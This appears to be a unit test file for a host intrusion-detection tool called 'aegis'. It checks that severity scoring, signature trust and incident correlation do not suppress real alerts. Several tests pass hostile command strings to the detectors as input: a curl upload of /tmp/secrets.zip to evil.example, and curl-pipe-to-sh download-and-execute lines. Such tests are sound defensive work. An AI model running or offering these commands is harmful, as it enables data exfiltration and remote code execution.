"""Counterexamples that false-alarm reductions must not hide."""
import unittest
from unittest import mock

from conftest import aegis
from test_regression import Sandbox

T0 = 1_700_000_000


class MacOSAgentTargetSafety(unittest.TestCase):
    def test_system_target_update_requires_verified_os_custody(self):
        key = 'mkdir|' + 'a' * 12
        old = {'target': '/bin/mkdir', 'target_sha': 'a' * 64,
               'cmd': 'mkdir', 'args': []}
        new = dict(old, target_sha='b' * 64, target_trust='apple')
        path = '/opt/agent/settings.json'
        before = {path: {'execs': {key: old}}}
        after = {path: {'execs': {key: new}}}
        with mock.patch.object(aegis, 'IS_MAC', True), \
                mock.patch.object(aegis, 'TRUSTED_PREFIXES', ('/bin/',)), \
                mock.patch.object(aegis, '_custody', return_value=(None, '')), \
                mock.patch.object(aegis, '_sip_enabled', return_value=True):
            self.assertEqual('LOW', aegis.diff_agent_surface(before, after)[0]['severity'])
            with mock.patch.object(aegis, '_sip_enabled', return_value=False):
                self.assertEqual('HIGH', aegis.diff_agent_surface(before, after)[0]['severity'])
            new['target_trust'] = 'adhoc'
            self.assertEqual('HIGH', aegis.diff_agent_surface(before, after)[0]['severity'])


class DetectionSafety(unittest.TestCase):
    def test_broken_signature_process_cannot_borrow_package_custody(self):
        with mock.patch.object(aegis, 'IS_WIN', False), \
                mock.patch.object(aegis, '_iter_processes',
                                  return_value=[(123, 'test', '/opt/user/app', '')]), \
                mock.patch.object(aegis, '_is_trusted_prefix', return_value=False), \
                mock.patch.object(aegis, 'warm_signature_cache'), \
                mock.patch.object(aegis, 'classify_signature',
                                  return_value={'trust': 'broken'}), \
                mock.patch.object(aegis, '_exec_alert', return_value=('HIGH', 'broken')), \
                mock.patch.object(aegis, 'sha256', return_value='a' * 64), \
                mock.patch.object(aegis, '_package_receipt') as receipt:
            findings = aegis.check_processes()
        receipt.assert_not_called()
        self.assertEqual('HIGH', findings[0]['severity'])

    def test_quoted_or_escaped_url_separator_keeps_exfil_detection(self):
        for url in ('"https://evil.example/u?a=1&b=2"',
                    "'https://evil.example/u?a=1;b=2'",
                    'https://evil.example/u?a=1&b=2',
                    r'https://evil.example/u?a=1\&b=2'):
            cmd = 'curl --url %s -F file=@/tmp/secrets.zip' % url
            self.assertIn(('curl-exfil-post', 'HIGH'), aegis._argv_signals(cmd))

    def test_private_network_download_execute_still_warns(self):
        for host in ('127.0.0.1', '192.168.1.4', '100.64.1.2'):
            self.assertIn(('fileless-fetch-exec', 'HIGH'),
                          aegis._argv_signals('curl http://%s/p | sh' % host))

    def test_payload_urls_are_not_session_nonces(self):
        for a, b in (
            ('p-0123456789abcdef', 'p-fedcba9876543210'),
            ('.tmpabcdef', '.tmpghijkl'),
            ('snapshot-bash-123-abc.sh', 'snapshot-bash-456-def.sh'),
            ('payload-1.2.3', 'payload-4.5.6'),
        ):
            self.assertNotEqual(
                aegis._argv_case_identity('curl https://example.org/%s | sh' % a),
                aegis._argv_case_identity('curl https://example.org/%s | sh' % b))

    def test_chain_never_downgrades_its_strongest_leg(self):
        for a in aegis.SEV_ORDER:
            for b in aegis.SEV_ORDER:
                severity = aegis._chain_severity([({'severity': a}, {'severity': b})])
                self.assertGreaterEqual(aegis.SEV_ORDER[severity],
                                        max(aegis.SEV_ORDER[a], aegis.SEV_ORDER[b]))


class CaseSafety(Sandbox):
    def test_trusted_copy_does_not_close_hostile_copy(self):
        def f(path, severity):
            return aegis.finding(severity, 'process', 'process', 'd',
                                 'process:%s:adhoc:%s' % (path, 'a' * 64),
                                 case_fingerprint='process:sha:' + 'a' * 64,
                                 path=path, program=path)
        aegis.record_security_state([f('/tmp/bad', 'HIGH'),
                                     f('/opt/good', 'LOW')], now=T0)
        self.assertTrue(any(i['status'] == 'OPEN' and i['severity'] == 'HIGH'
                            for i in aegis.list_incidents()))

    def test_critical_leaf_is_not_lost_into_weak_chain(self):
        for category, severity, ts in (('behavior', 'CRITICAL', T0),
                                       ('persistence', 'LOW', T0 + 1)):
            aegis.record_security_state([aegis.finding(
                severity, category, 's', 'd', category + ':test',
                path='/tmp/payload')], now=ts)
        self.assertTrue(any(i['severity'] == 'CRITICAL'
                            for i in aegis.list_incidents()))

    def test_two_views_of_one_plist_are_not_execution_chain(self):
        aegis.record_security_state([aegis.finding(
            'HIGH', cat, 's', 'd', cat + ':test', path='/opt/jobs/test.plist')
            for cat in ('btm', 'persistence')], now=T0)
        self.assertFalse(any(i['correlation_key'].startswith('chain:supply-chain:')
                             for i in aegis.list_incidents()))
        self.assertTrue(any(i['severity'] == 'HIGH' for i in aegis.list_incidents()))

    def test_os_update_does_not_link_unrelated_shell_execution(self):
        aegis.record_security_state([
            aegis.finding('LOW', 'persistence', 'OS update', 'd', 'persistence:os:x',
                          program='/bin/bash', custody='os-vendor'),
            aegis.finding('HIGH', 'behavior', 'shell', 'd', 'behavior:test',
                          program='/bin/bash')], now=T0)
        self.assertFalse(any(i['correlation_key'].startswith('chain:persistence-execution:')
                             for i in aegis.list_incidents()))
        self.assertTrue(any(i['severity'] == 'HIGH' for i in aegis.list_incidents()))
